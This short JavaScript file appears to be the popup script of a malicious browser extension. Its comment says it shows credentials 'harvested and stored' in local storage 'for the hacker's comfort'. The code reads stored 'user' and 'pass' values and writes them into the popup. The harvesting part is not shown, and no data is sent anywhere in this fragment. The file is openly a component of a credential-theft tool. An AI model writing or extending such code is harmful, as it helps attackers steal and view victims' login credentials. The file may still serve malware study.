// Try to get the credentials that were harvested and stored in the
// browser's localstorage and set the html popup window to show these
// for the hacker's comfort
setTimeout(function() {
    browser.storage.local.get("user", function(result) {
        result = result.user;
        if (result != undefined && result != "")
            document.getElementById("user").innerHTML = result;
    });
    browser.storage.local.get("pass", function(result) {
        result = result.pass;
        if (result != undefined && result != "")
            document.getElementById("pass").innerHTML = result;
    });
}, 1000);

